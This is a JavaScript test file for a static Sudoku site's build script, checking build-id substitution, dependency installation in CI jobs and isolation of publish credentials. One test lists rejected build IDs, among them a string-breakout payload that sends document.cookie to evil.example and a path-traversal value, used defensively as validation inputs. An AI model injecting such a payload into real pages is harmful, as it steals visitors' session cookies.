/* The build machinery, checked where the published tree cannot check it.

   tests/site.test.mjs asserts on what _site contains today. Two things it
   cannot see, and both are the kind that fail silently:

   1. The __BUILD__ substitution. No file in the repository carries the
      placeholder yet, so every published file substitutes zero times and a
      broken substitution would look exactly like the current, correct build.
      The day a service worker lands, a silent failure there pins every
      returning visitor to the cache they already have, with a green build.
   2. Whether the deploy job installs what the build imports. This used to be
      the mirror of that question: the build imported node: builtins only, so
      the deploy job installed nothing. Minification ended that, because
      html-minifier-terser and terser cannot be had from builtins, and the
      assertion was inverted rather than deleted. The failure it guards is
      unchanged in shape and still silent on a pull request: the build resolves
      its imports from a node_modules that only the local checkout has, and the
      deploy breaks at the point where the only thing left to do is publish.

   The substitution tests build a fixture tree rather than the repository, so
   they exercise the code path that has no input in this tree yet. */

import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { build, BUILD_ID_PATTERN, PLACEHOLDER } from '../scripts/build.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');

/* A minimal publishable tree: the one required allowlist entry, plus the two
   optional text files whose whole point is to carry the build id. */
function fixture(t) {
  const dir = mkdtempSync(join(tmpdir(), 'sudoku-build-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));

  writeFileSync(join(dir, 'index.html'), `<!doctype html><meta name=b content=${PLACEHOLDER}>`);
  writeFileSync(join(dir, 'sw.js'), `const CACHE = "sudoku-${PLACEHOLDER}";\n`);
  writeFileSync(join(dir, 'manifest.webmanifest'), `{"name":"s","id":"${PLACEHOLDER}"}`);
  /* Not text, so it must come through byte for byte and never be re-encoded. */
  mkdirSync(join(dir, 'icons'));
  const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe]);
  writeFileSync(join(dir, 'icons', 'app.png'), png);

  return { dir, out: join(dir, '_site'), png };
}

const read = (out, file) => readFileSync(join(out, file), 'utf8');

test('the build id replaces every __BUILD__ in every published text file', (t) => {
  const { dir, out, png } = fixture(t);

  const result = build({ root: dir, outDir: out, buildId: 'deadbeef1234' });

  assert.equal(result.buildId, 'deadbeef1234');
  assert.equal(result.idSource, 'BUILD_ID');

  const counts = Object.fromEntries(result.files.map((f) => [f.path, f.substitutions]));
  assert.deepEqual(counts, {
    'index.html': 1,
    'manifest.webmanifest': 1,
    'sw.js': 1,
    'icons/app.png': 0,
  });

  assert.equal(read(out, 'sw.js'), 'const CACHE = "sudoku-deadbeef1234";\n');
  assert.equal(JSON.parse(read(out, 'manifest.webmanifest')).id, 'deadbeef1234');
  for (const file of ['index.html', 'sw.js', 'manifest.webmanifest']) {
    assert.equal(
      read(out, file).includes(PLACEHOLDER),
      false,
      `${file} still holds ${PLACEHOLDER} after the build`,
    );
  }
  assert.deepEqual(readFileSync(join(out, 'icons', 'app.png')), png);
});

test('a build id that could break out of a string literal is refused', (t) => {
  const { dir, out } = fixture(t);

  /* The id is spliced verbatim into a service worker, which the browser runs
     with origin scope, and into JSON. Each of these ends the published file as
     something other than what it was. */
  const rejected = [
    'x"; fetch("https://evil.example/" + document.cookie); //',
    'abc\ndef',
    '../../etc',
    'a b',
    "it's",
    '-leading-dash',
    'x'.repeat(65),
  ];

  for (const id of rejected) {
    assert.equal(BUILD_ID_PATTERN.test(id), false, `${JSON.stringify(id)} should not match`);
    assert.throws(
      () => build({ root: dir, outDir: out, buildId: id }),
      /refusing to publish with BUILD_ID/,
      `build accepted ${JSON.stringify(id)}`,
    );
  }

  /* The shape CI actually passes, a commit SHA, has to keep working. */
  assert.equal(BUILD_ID_PATTERN.test('0123456789abcdef0123456789abcdef01234567'), true);
});

test('every job that builds the site installs what the build imports', () => {
  const source = readFileSync(join(root, 'scripts', 'build.mjs'), 'utf8');
  const specifiers = [...source.matchAll(/\bfrom\s+'([^']+)'/g)].map((m) => m[1]);

  assert.ok(specifiers.length > 0, 'found no imports at all, so this check read the wrong file');
  const external = specifiers.filter((s) => !s.startsWith('node:'));

  /* Every external import has to be a declared devDependency. A package that
     resolves locally because something else happened to hoist it into
     node_modules is not installed by npm ci on a clean runner. */
  const { devDependencies = {} } = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  const undeclared = external.filter((name) => !Object.hasOwn(devDependencies, name));
  assert.deepEqual(
    undeclared,
    [],
    'scripts/build.mjs imports packages that package.json does not declare, so npm ci will ' +
      `not install them:\n  ${undeclared.join('\n  ')}`,
  );

  /* And if the build needs node_modules at all, every workflow job that runs
     it has to install them first. The Deploy job deliberately installed
     nothing until minification landed; this is what stops it silently
     regressing to that while the build still imports a minifier. */
  if (external.length === 0) return;

  const workflows = join(root, '.github', 'workflows');
  for (const name of readdirSync(workflows)) {
    const yaml = readFileSync(join(workflows, name), 'utf8');
    for (const [, job] of yaml.matchAll(/^ {2}([\w-]+):$/gm)) {
      /* Crude on purpose: the job's text is everything from its key to the
         next one at the same indentation. Enough to ask whether the job that
         runs the build also runs the install. */
      const start = yaml.indexOf(`\n  ${job}:`);
      const next = yaml.slice(start + 1).search(/\n {2}[\w-]+:$/m);
      const body = next === -1 ? yaml.slice(start) : yaml.slice(start, start + 1 + next);
      if (!/run:\s*npm run build/.test(body)) continue;
      assert.match(
        body,
        /run:\s*npm ci/,
        `${name}: the "${job}" job runs npm run build but never installs, and the build now ` +
          `imports ${external.join(', ')} from node_modules, so the publish step crashes`,
      );
    }
  }
});

test('the job holding the publish credentials runs no third party code', () => {
  /* The deploy job is the only one granted pages: write and id-token: write.
     It once grew a checkout, node and npm because minification needed a
     dependency, which put the entire npm tree next to the publish credentials.
     The artifact is now built and tested by the unprivileged Verify job and
     deploy only publishes it.

     This is the guard for that shape. It is deliberately about the job that
     holds the credentials rather than about a named job, so renaming Deploy
     does not silently switch the check off. */
  const workflow = readFileSync(join(root, '.github/workflows/deploy-pages.yml'), 'utf8');

  /* The tail of the lookahead is $(?![\s\S]), not \Z: JavaScript has no \Z, and
     in a non-unicode pattern it is an identity escape matching a literal "Z".
     That is not a harmless typo. The lazy body would stop at the first capital
     Z after a job's key, so one word like "Zero" in a comment above the steps
     truncates the deploy job's text to its permissions block. jobs.length stays
     1, the filter below still sees pages: write, and every assertion after it
     passes because it is reading a body with no steps in it. The guard on the
     job that holds the publish credentials would go quiet without failing. */
  const jobs = [...workflow.matchAll(/^ {2}([\w-]+):\n([\s\S]*?)(?=^ {2}[\w-]+:|$(?![\s\S]))/gm)]
    .map(([, name, body]) => ({ name, body }))
    .filter(({ body }) => /^ {6}pages:\s*write/m.test(body));

  assert.equal(jobs.length, 1, 'exactly one job should hold pages: write');

  const { name, body } = jobs[0];
  for (const [pattern, what] of [
    [/uses:\s*actions\/checkout/, 'checks out the repository'],
    [/uses:\s*actions\/setup-node/, 'installs node'],
    [/run:\s*npm /, 'runs npm'],
  ]) {
    assert.ok(
      !pattern.test(body),
      `the "${name}" job holds pages: write and ${what}. Build the artifact in ` +
        'Verify and let this job only deploy it, so the dependency tree never sits ' +
        'beside the publish credentials.',
    );
  }

  /* Every action it does use must be GitHub owned, since anything else would be
     third party code running with those credentials. */
  for (const [, action] of body.matchAll(/uses:\s*([^@\s]+)@/g)) {
    assert.ok(
      action.startsWith('actions/'),
      `the "${name}" job uses ${action}, which is not a GitHub owned action`,
    );
  }
});
